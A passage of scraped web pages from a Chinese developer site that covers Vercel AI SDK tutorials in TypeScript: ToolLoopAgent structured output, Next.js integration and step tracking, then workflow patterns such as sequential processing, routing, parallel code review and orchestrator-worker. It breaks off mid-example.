</code></pre>
<h2 data-id="heading-5">5. 结构化输出 (Structured Output)</h2>
<p>如果你的应用需要 JSON 格式的输出（例如用于填充 UI 组件），可以使用 <code>output</code> 属性强制 Agent 返回特定结构的数据。</p>
<p>TypeScript</p>
<pre><code class="hljs language-csharp" lang="csharp">import { ToolLoopAgent, Output, stepCountIs } <span class="hljs-keyword">from</span> <span class="hljs-string">'ai'</span>;
import { z } <span class="hljs-keyword">from</span> <span class="hljs-string">'zod'</span>;

<span class="hljs-keyword">const</span> analysisAgent = <span class="hljs-keyword">new</span> ToolLoopAgent({
  model: <span class="hljs-string">"anthropic/claude-sonnet-4.5"</span>,
  <span class="hljs-comment">// 定义输出 Schema</span>
  output: Output.<span class="hljs-built_in">object</span>({
    schema: z.<span class="hljs-built_in">object</span>({
      sentiment: z.<span class="hljs-built_in">enum</span>([<span class="hljs-string">'positive'</span>, <span class="hljs-string">'neutral'</span>, <span class="hljs-string">'negative'</span>]),
      summary: z.<span class="hljs-built_in">string</span>(),
      keyPoints: z.array(z.<span class="hljs-built_in">string</span>()),
    }),
  }),
  stopWhen: stepCountIs(<span class="hljs-number">10</span>),
});

<span class="hljs-comment">// 使用示例</span>
<span class="hljs-function"><span class="hljs-keyword">async</span> function <span class="hljs-title">runAnalysis</span>()</span> {
  <span class="hljs-keyword">const</span> { output } = <span class="hljs-keyword">await</span> analysisAgent.generate({
    prompt: <span class="hljs-string">'Analyze customer feedback from the last quarter'</span>,
  });
  
  <span class="hljs-comment">// output 将严格符合上面的 Zod Schema，且由 TS 自动推断类型</span>
  console.log(output.sentiment); 
}
</code></pre>
<h2 data-id="heading-6">6. 实战集成：在 Next.js API 中使用</h2>
<p>定义好 Agent 后，最常见的场景是在 API 路由中提供服务。<code>ToolLoopAgent</code> 提供了极简的集成方式。</p>
<h3 data-id="heading-7">方式一：流式传输给前端 (UI Streams)</h3>
<p>这是构建 Chatbot 最常用的方式，能够直接对接 AI SDK 的前端 Hooks。</p>
<p>TypeScript</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// app/api/chat/route.ts</span>
<span class="hljs-keyword">import</span> { createAgentUIStreamResponse } <span class="hljs-keyword">from</span> <span class="hljs-string">'ai'</span>;
<span class="hljs-keyword">import</span> { myAgent } <span class="hljs-keyword">from</span> <span class="hljs-string">'@/agents/my-agent'</span>; <span class="hljs-comment">// 假设你在这个文件定义了 agent</span>

<span class="hljs-keyword">export</span> <span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">POST</span>(<span class="hljs-params">request: Request</span>) {
  <span class="hljs-keyword">const</span> { messages } = <span class="hljs-keyword">await</span> request.<span class="hljs-title function_">json</span>();

  <span class="hljs-keyword">return</span> <span class="hljs-title function_">createAgentUIStreamResponse</span>({
    <span class="hljs-attr">agent</span>: myAgent,
    <span class="hljs-attr">uiMessages</span>: messages, <span class="hljs-comment">// 直接传入前端发送的消息历史</span>
  });
}
</code></pre>
<h3 data-id="heading-8">方式二：服务端生成文本</h3>
<p>如果你只需要在服务端获取结果：</p>
<p>TypeScript</p>
<pre><code class="hljs language-vbnet" lang="vbnet"><span class="hljs-keyword">const</span> result = <span class="hljs-built_in">await</span> myAgent.generate({
  prompt: <span class="hljs-comment">'What is the weather like in Tokyo?',</span>
});

console.log(result.<span class="hljs-keyword">text</span>);
</code></pre>
<h2 data-id="heading-9">7. 进阶技巧：类型安全与监控</h2>
<h3 data-id="heading-10">端到端类型安全 (End-to-end Type Safety)</h3>
<p>AI SDK 允许你推断 Agent 的消息类型，确保前端 <code>useChat</code> 与后端完全同步。</p>
<p>TypeScript</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// agent.ts</span>
<span class="hljs-keyword">import</span> { <span class="hljs-title class_">ToolLoopAgent</span>, <span class="hljs-title class_">InferAgentUIMessage</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">'ai'</span>;

<span class="hljs-keyword">export</span> <span class="hljs-keyword">const</span> myAgent = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ToolLoopAgent</span>({ ... });

<span class="hljs-comment">// 导出类型</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">type</span> <span class="hljs-title class_">MyAgentUIMessage</span> = <span class="hljs-title class_">InferAgentUIMessage</span>&lt;<span class="hljs-keyword">typeof</span> myAgent&gt;;
</code></pre>
<p>在前端组件中：</p>
<p>TypeScript</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// components/chat.tsx</span>
<span class="hljs-string">'use client'</span>;
<span class="hljs-keyword">import</span> { useChat } <span class="hljs-keyword">from</span> <span class="hljs-string">'@ai-sdk/react'</span>;
<span class="hljs-keyword">import</span> type { <span class="hljs-title class_">MyAgentUIMessage</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">'@/agent.ts'</span>;

<span class="hljs-keyword">export</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">Chat</span>(<span class="hljs-params"/>) {
  <span class="hljs-comment">// 泛型支持，获得完整的类型提示</span>
  <span class="hljs-keyword">const</span> { messages } = useChat&lt;<span class="hljs-title class_">MyAgentUIMessage</span>&gt;();
  <span class="hljs-comment">// ...</span>
}
</code></pre>
<h3 data-id="heading-11">步骤追踪 (Tracking)</h3>
<p>通过 <code>onStepFinish</code> 回调，你可以轻松监控 Token 消耗或记录 Agent 的思考过程。</p>
<p>TypeScript</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">const</span> agent = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ToolLoopAgent</span>({
  <span class="hljs-attr">model</span>: <span class="hljs-string">"anthropic/claude-sonnet-4.5"</span>,
  <span class="hljs-attr">onStepFinish</span>: <span class="hljs-keyword">async</span> ({ usage, finishReason, toolCalls }) =&gt; {
    <span class="hljs-comment">// 全局日志记录</span>
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`Step used <span class="hljs-subst">${usage.totalTokens}</span> tokens`</span>);
    <span class="hljs-keyword">if</span> (toolCalls) {
      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'Tools used:'</span>, toolCalls.<span class="hljs-title function_">map</span>(<span class="hljs-function"><span class="hljs-params">tc</span> =&gt;</span> tc.<span class="hljs-property">toolName</span>));
    }
  },
});
</code></pre>
<h2 data-id="heading-12">总结</h2>
<p><code>ToolLoopAgent</code> 是 AI SDK 中一个非常强大的抽象。它不再要求开发者手动管理复杂的对话循环，而是将重心回归到 <strong>Prompt 设计</strong>、<strong>工具定义</strong> 和 <strong>数据结构</strong> 上。</p>
<p>通过本文，你应该已经掌握了：</p>
<ol>
<li>如何实例化一个 Agent。</li>
<li>如何添加 Zod 定义的工具。</li>
<li>如何控制 Agent 的推理循环。</li>
<li>如何在 Next.js 中快速部署 Agent API。</li>
</ol>
<p>快去尝试重构你的 AI 应用吧！</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[🚀 Vercel AI SDK 使用指南：工作流模式(Workflows)]]></title>    <link>https://juejin.cn/post/7605782093481852954</link>    <guid>https://juejin.cn/post/7605782093481852954</guid>    <pubDate>2026-02-12T12:15:12.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7605782093481852954" data-draft-id="7605552034570403886" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="🚀 Vercel AI SDK 使用指南：工作流模式(Workflows)"/> <meta itemprop="keywords" content="Agent,LangChain"/> <meta itemprop="datePublished" content="2026-02-12T12:15:12.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="ZaneAI"/> <meta itemprop="url" content="https://juejin.cn/user/186266444380203"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            🚀 Vercel AI SDK 使用指南：工作流模式(Workflows)
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/186266444380203/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    ZaneAI
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-12T12:15:12.000Z" title="Thu Feb 12 2026 12:15:12 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-12
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    8
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读3分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">为什么要使用工作流？</h2>
<p>直接让 LLM “一步到位”往往会导致不稳定的输出。通过工作流模式，我们可以：</p>
<ul>
<li><strong>分解复杂度</strong>：将大任务拆解为小步骤。</li>
<li><strong>提高可靠性</strong>：在步骤之间加入检查和重试机制。</li>
<li><strong>降低成本</strong>：简单的步骤使用小模型，复杂的步骤使用大模型。</li>
</ul>
<p>AI SDK 总结了 5 种最常用的模式：<strong>顺序处理、路由、并行处理、编排者-执行者、评估-优化</strong>。</p>
<hr/>
<h2 data-id="heading-1">1. 顺序处理 (Sequential Processing)</h2>
<p>这是最基础的模式。上一步的输出作为下一步的输入，形成一条链。适合内容生成流水线或数据转换。</p>
<p><strong>场景</strong>：写一段营销文案，然后检查质量，如果质量不达标则重写。</p>
<p>TypeScript</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">import</span> { generateText, generateObject } <span class="hljs-keyword">from</span> <span class="hljs-string">'ai'</span>;
<span class="hljs-keyword">import</span> { z } <span class="hljs-keyword">from</span> <span class="hljs-string">'zod'</span>;
<span class="hljs-keyword">import</span> { anthropic } <span class="hljs-keyword">from</span> <span class="hljs-string">'@ai-sdk/anthropic'</span>; <span class="hljs-comment">// 假设使用 Anthropic</span>

<span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">generateMarketingCopy</span>(<span class="hljs-params">input: string</span>) {
  <span class="hljs-keyword">const</span> model = <span class="hljs-title function_">anthropic</span>(<span class="hljs-string">'claude-3-5-sonnet-20240620'</span>);

  <span class="hljs-comment">// 第一步：生成初稿</span>
  <span class="hljs-keyword">const</span> { <span class="hljs-attr">text</span>: copy } = <span class="hljs-keyword">await</span> <span class="hljs-title function_">generateText</span>({
    model,
    <span class="hljs-attr">prompt</span>: <span class="hljs-string">`为以下产品撰写有说服力的营销文案：<span class="hljs-subst">${input}</span>。注重利益点和情感共鸣。`</span>,
  });

  <span class="hljs-comment">// 第二步：质量检查 (结构化输出)</span>
  <span class="hljs-keyword">const</span> { <span class="hljs-attr">object</span>: qualityMetrics } = <span class="hljs-keyword">await</span> <span class="hljs-title function_">generateObject</span>({
    model,
    <span class="hljs-attr">schema</span>: z.<span class="hljs-title function_">object</span>({
      <span class="hljs-attr">hasCallToAction</span>: z.<span class="hljs-title function_">boolean</span>(), <span class="hljs-comment">// 是否有号召性用语</span>
      <span class="hljs-attr">emotionalAppeal</span>: z.<span class="hljs-title function_">number</span>().<span class="hljs-title function_">min</span>(<span class="hljs-number">1</span>).<span class="hljs-title function_">max</span>(<span class="hljs-number">10</span>), <span class="hljs-comment">// 情感分</span>
      <span class="hljs-attr">clarity</span>: z.<span class="hljs-title function_">number</span>().<span class="hljs-title function_">min</span>(<span class="hljs-number">1</span>).<span class="hljs-title function_">max</span>(<span class="hljs-number">10</span>), <span class="hljs-comment">// 清晰度</span>
    }),
    <span class="hljs-attr">prompt</span>: <span class="hljs-string">`评估这段文案：
    1. 是否包含号召性用语 (true/false)
    2. 情感吸引力 (1-10)
    3. 清晰度 (1-10)
    
    待评估文案：<span class="hljs-subst">${copy}</span>`</span>,
  });

  <span class="hljs-comment">// 第三步：根据检查结果决定是否重写 (条件逻辑)</span>
  <span class="hljs-keyword">if</span> (
    !qualityMetrics.<span class="hljs-property">hasCallToAction</span> ||
    qualityMetrics.<span class="hljs-property">emotionalAppeal</span> &lt; <span class="hljs-number">7</span> ||
    qualityMetrics.<span class="hljs-property">clarity</span> &lt; <span class="hljs-number">7</span>
  ) {
    <span class="hljs-keyword">const</span> { <span class="hljs-attr">text</span>: improvedCopy } = <span class="hljs-keyword">await</span> <span class="hljs-title function_">generateText</span>({
      model,
      <span class="hljs-attr">prompt</span>: <span class="hljs-string">`重写这段文案，必须包含：
      <span class="hljs-subst">${!qualityMetrics.hasCallToAction ? <span class="hljs-string">'- 清晰的号召性用语'</span> : <span class="hljs-string">''</span>}</span>
      <span class="hljs-subst">${qualityMetrics.emotionalAppeal &lt; <span class="hljs-number">7</span> ? <span class="hljs-string">'- 更强的情感吸引力'</span> : <span class="hljs-string">''</span>}</span>
      <span class="hljs-subst">${qualityMetrics.clarity &lt; <span class="hljs-number">7</span> ? <span class="hljs-string">'- 提高清晰度和直接性'</span> : <span class="hljs-string">''</span>}</span>
      
      原文：<span class="hljs-subst">${copy}</span>`</span>,
    });
    <span class="hljs-keyword">return</span> { <span class="hljs-attr">copy</span>: improvedCopy, qualityMetrics, <span class="hljs-attr">status</span>: <span class="hljs-string">'improved'</span> };
  }

  <span class="hljs-keyword">return</span> { copy, qualityMetrics, <span class="hljs-attr">status</span>: <span class="hljs-string">'original'</span> };
}
</code></pre>
<hr/>
<h2 data-id="heading-2">2. 路由 (Routing)</h2>
<p>路由模式让 LLM 充当“交通指挥官”。它分析用户的意图，然后决定下一步由哪个模型处理，或者使用什么 Prompt。</p>
<p><strong>场景</strong>：根据用户咨询的类型（退款、技术支持、一般问题），分配给不同的处理逻辑或不同大小的模型。</p>
<p>TypeScript</p>
<pre><code class="hljs language-php" lang="php">import { generateObject, generateText } <span class="hljs-keyword">from</span> <span class="hljs-string">'ai'</span>;
import { z } <span class="hljs-keyword">from</span> <span class="hljs-string">'zod'</span>;
import { openai } <span class="hljs-keyword">from</span> <span class="hljs-string">'@ai-sdk/openai'</span>;

async <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">handleCustomerQuery</span>(<span class="hljs-params">query: <span class="hljs-keyword">string</span></span>) </span>{
  <span class="hljs-keyword">const</span> <span class="hljs-variable constant_">classifierModel</span> = <span class="hljs-title function_ invoke__">openai</span>(<span class="hljs-string">'gpt-4o'</span>); <span class="hljs-comment">// 智能分类用强模型</span>

  <span class="hljs-comment">// 第一步：分类查询意图</span>
  <span class="hljs-keyword">const</span> { <span class="hljs-keyword">object</span>: classification } = await <span class="hljs-title function_ invoke__">generateObject</span>({
    <span class="hljs-attr">model</span>: classifierModel,
    <span class="hljs-attr">schema</span>: z.<span class="hljs-keyword">object</span>({
      <span class="hljs-attr">reasoning</span>: z.<span class="hljs-keyword">string</span>(),
      type: z.<span class="hljs-keyword">enum</span>([<span class="hljs-string">'general'</span>, <span class="hljs-string">'refund'</span>, <span class="hljs-string">'technical'</span>]),
      complexity: z.<span class="hljs-keyword">enum</span>([<span class="hljs-string">'simple'</span>, <span class="hljs-string">'complex'</span>]),
    }),
    prompt: `对该客户查询进行分类：
    ${query}
    
    请确定：
    <span class="hljs-number">1</span>. 查询类型 (general, refund, technical)
    <span class="hljs-number">2</span>. 复杂度 (simple, complex)
    <span class="hljs-number">3</span>. 分类理由`,
  });

  <span class="hljs-comment">// 第二步：路由逻辑</span>
  <span class="hljs-comment">// 根据复杂度选择模型：简单问题用小模型省钱，复杂问题用大模型</span>
  <span class="hljs-keyword">const</span> <span class="hljs-variable constant_">targetModel</span> = classification.complexity === <span class="hljs-string">'simple'</span>
    ? <span class="hljs-title function_ invoke__">openai</span>(<span class="hljs-string">'gpt-4o-mini'</span>)
    : <span class="hljs-title function_ invoke__">openai</span>(<span class="hljs-string">'gpt-4o'</span>);

  <span class="hljs-comment">// 根据类型选择系统提示词 (System Prompt)</span>
  <span class="hljs-keyword">const</span> <span class="hljs-variable constant_">systemPrompts</span> = {
    general: <span class="hljs-string">'你是一位专业的客服代表，处理一般性咨询。'</span>,
    refund: <span class="hljs-string">'你是一位专门处理退款的客服。请遵循公司政策并收集必要信息。'</span>,
    technical: <span class="hljs-string">'你是一位拥有深厚产品知识的技术支持专家。专注于清晰的分步故障排除。'</span>,
  };

  <span class="hljs-keyword">const</span> { text: response } = await <span class="hljs-title function_ invoke__">generateText</span>({
    <span class="hljs-attr">model</span>: targetModel,
    <span class="hljs-attr">system</span>: systemPrompts[classification.type],
    <span class="hljs-attr">prompt</span>: query,
  });

  <span class="hljs-keyword">return</span> { response, classification };
}
</code></pre>
<hr/>
<h2 data-id="heading-3">3. 并行处理 (Parallel Processing)</h2>
<p>当任务包含多个相互独立的部分时，可以同时运行它们。这既提高了速度，又能让每个 Prompt 专注于单一职责。</p>
<p><strong>场景</strong>：代码审查（Code Review）。同时从“安全性”、“性能”和“可维护性”三个维度进行审查，最后汇总。</p>
<p>TypeScript</p>
<pre><code class="hljs language-less" lang="less"><span class="hljs-selector-tag">import</span> { <span class="hljs-selector-tag">generateText</span>, <span class="hljs-selector-tag">generateObject</span> } <span class="hljs-selector-tag">from</span> '<span class="hljs-selector-tag">ai</span>';
<span class="hljs-selector-tag">import</span> { <span class="hljs-selector-tag">z</span> } <span class="hljs-selector-tag">from</span> '<span class="hljs-selector-tag">zod</span>';
<span class="hljs-selector-tag">import</span> { <span class="hljs-selector-tag">anthropic</span> } <span class="hljs-selector-tag">from</span> '@<span class="hljs-selector-tag">ai-sdk</span>/<span class="hljs-selector-tag">anthropic</span>';

<span class="hljs-selector-tag">async</span> <span class="hljs-selector-tag">function</span> <span class="hljs-selector-tag">parallelCodeReview</span>(<span class="hljs-attribute">code</span>: string) {
  <span class="hljs-selector-tag">const</span> <span class="hljs-selector-tag">model</span> = <span class="hljs-selector-tag">anthropic</span>(<span class="hljs-string">'claude-3-5-sonnet-20240620'</span>);

  <span class="hljs-comment">// 使用 Promise.all 并行执行三个独立的审查任务</span>
  <span class="hljs-selector-tag">const</span> <span class="hljs-selector-attr">[securityReview, performanceReview, maintainabilityReview]</span> = <span class="hljs-selector-tag">await</span> <span class="hljs-selector-tag">Promise</span><span class="hljs-selector-class">.all</span>([
    <span class="hljs-built_in">generateObject</span>({
      model,
      <span class="hljs-attribute">system</span>: <span class="hljs-string">'你是代码安全专家。专注于识别漏洞、注入风险和认证问题。'</span>,
      <span class="hljs-attribute">schema</span>: z.<span class="hljs-built_in">object</span>({
        <span class="hljs-attribute">vulnerabilities</span>: z.<span class="hljs-built_in">array</span>(z.<span class="hljs-built_in">string</span>()),
        <span class="hljs-attribute">riskLevel</span>: z.<span class="hljs-built_in">enum</span>([<span class="hljs-string">'low'</span>, <span class="hljs-string">'medium'</span>, <span class="hljs-string">'high'</span>]),
        <span class="hljs-attribute">suggestions</span>: z.<span class="hljs-built_in">array</span>(z.<span class="hljs-built_in">string</span>()),
      }),
      <span class="hljs-attribute">prompt</span>: <span class="hljs-built_in">`审查代码：${code}`</span>,
    }),
    <span class="hljs-built_in">generateObject</span>({
      model,
      <span class="hljs-attribute">system</span>: <span class="hljs-string">'你是性能优化专家。专注于识别瓶颈、内存泄漏和优化机会。'</span>,
      <span class="hljs-attribute">schema</span>: z.<span class="hljs-built_in">object</span>({
        <span class="hljs-attribute">issues</span>: z.<span class="hljs-built_in">array</span>(z.<span class="hljs-built_in">string</span>()),
        <span class="hljs-attribute">impact</span>: z.<span class="hljs-built_in">enum</span>([<span class="hljs-string">'low'</span>, <span class="hljs-string">'medium'</span>, <span class="hljs-string">'high'</span>]),
        <span class="hljs-attribute">optimizations</span>: z.<span class="hljs-built_in">array</span>(z.<span class="hljs-built_in">string</span>()),
      }),
      <span class="hljs-attribute">prompt</span>: <span class="hljs-built_in">`审查代码：${code}`</span>,
    }),
    <span class="hljs-built_in">generateObject</span>({
      model,
      <span class="hljs-attribute">system</span>: <span class="hljs-string">'你是代码质量专家。专注于代码结构、可读性和最佳实践。'</span>,
      <span class="hljs-attribute">schema</span>: z.<span class="hljs-built_in">object</span>({
        <span class="hljs-attribute">concerns</span>: z.<span class="hljs-built_in">array</span>(z.<span class="hljs-built_in">string</span>()),
        <span class="hljs-attribute">qualityScore</span>: z.<span class="hljs-built_in">number</span>().<span class="hljs-built_in">min</span>(<span class="hljs-number">1</span>).<span class="hljs-built_in">max</span>(<span class="hljs-number">10</span>),
        <span class="hljs-attribute">recommendations</span>: z.<span class="hljs-built_in">array</span>(z.<span class="hljs-built_in">string</span>()),
      }),
      <span class="hljs-attribute">prompt</span>: <span class="hljs-built_in">`审查代码：${code}`</span>,
    }),
  ]);

  <span class="hljs-comment">// 数据聚合</span>
  <span class="hljs-selector-tag">const</span> <span class="hljs-selector-tag">reviews</span> = <span class="hljs-selector-attr">[    { ...securityReview.object, type: <span class="hljs-string">'security'</span> },    { ...performanceReview.object, type: <span class="hljs-string">'performance'</span> },    { ...maintainabilityReview.object, type: <span class="hljs-string">'maintainability'</span> },  ]</span>;

  <span class="hljs-comment">// 最后一步：汇总报告</span>
  <span class="hljs-selector-tag">const</span> { text: summary } = <span class="hljs-selector-tag">await</span> <span class="hljs-selector-tag">generateText</span>({
    <span class="hljs-selector-tag">model</span>,
    <span class="hljs-selector-tag">system</span>: '你是技术负责人，负责汇总多份代码审查报告。',
    <span class="hljs-selector-tag">prompt</span>: `将这些代码审查结果综合成一份简明的摘要，列出关键行动项：
    ${<span class="hljs-selector-tag">JSON</span><span class="hljs-selector-class">.stringify</span>(reviews, null, <span class="hljs-number">2</span>)}`,
  });

  <span class="hljs-selector-tag">return</span> { <span class="hljs-selector-tag">reviews</span>, <span class="hljs-selector-tag">summary</span> };
}
</code></pre>
<hr/>
<h2 data-id="heading-4">4. 编排者-执行者 (Orchestrator-Worker)</h2>
<p>这是处理复杂任务的强力模式。一个“编排者”模型负责制定计划（Plan），然后拆分出多个子任务，交给“执行者”模型去完成。</p>
<p><strong>场景</strong>：实现一个新功能。编排者决定需要修改哪些文件，执行者分别去写每个文件的代码。</p>
<p>TypeScript</p>
<pre><code class="hljs language-php" lang="php">import { generateObject } <span class="hljs-keyword">from</span> <span class="hljs-string">'ai'</span>;
import { z } <span class="hljs-keyword">from</span> <span class="hljs-string">'zod'</span>;
import { anthropic } <span class="hljs-keyword">from</span> <span class="hljs-string">'@ai-sdk/anthropic'</span>;

async <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">implementFeature</span>(<span class="hljs-params">featureRequest: <span class="hljs-keyword">string</span></span>) </span>{
  <span class="hljs-keyword">const</span> <span class="hljs-variable constant_">model</span> = <span class="hljs-title function_ invoke__">anthropic</span>(<span class="hljs-string">'claude-3-5-sonnet-20240620'</span>);

  <span class="hljs-comment">// 1. 编排者 (Orchestrator)：制定实施计划</span>
  <span class="hljs-keyword">const</span> { <span class="hljs-keyword">object</span>: implementationPlan } = await <span class="hljs-title function_ invoke__">generateObject</span>({
    model,
    <span class="hljs-attr">schema</span>: z.<span class="hljs-keyword">object</span>({
      <span class="hljs-attr">files</span>: z.<span class="hljs-keyword">array</span>(
        z.<span class="hljs-keyword">object</span>({
          <span class="hljs-attr">purpose</span>: z.<span class="hljs-keyword">string</span>(),
          filePath: z.<span class="hljs-keyword">string</span>(),
          changeType: z.<span class="hljs-keyword">enum</span>([<span class="hljs-string">'create'</span>, <span class="hljs-string">'modify'</span>, <span class="hljs-string">'delete'</span>]),
        }),
      ),
      estimatedComplexity: z.<span class="hljs-keyword">enum</span>([<span class="hljs-string">'low'</span>, <span class="hljs-string">'medium'</span>, <span class="hljs-string">'high'</span>]),
    }),
    system: <span class="hljs-string">'你是一位高级软件架构师，负责规划功能实现。'</span>,
    prompt: `分析此功能请求并制定实施计划：
    ${featureRequest}`,
  });

  <span class="hljs-comment">// 2. 执行者 (Workers)：根据计划并行执行</span>
  <span class="hljs-keyword">const</span> <span class="hljs-variable constant_">fileChanges</span> = await Promise.<span class="hljs-title function_ invoke__">all</span>(
    implementationPlan.files.<span class="hljs-title function_ invoke__">map</span>(<span class="hljs-title function_ invoke__">async</span> (file) =&gt; {
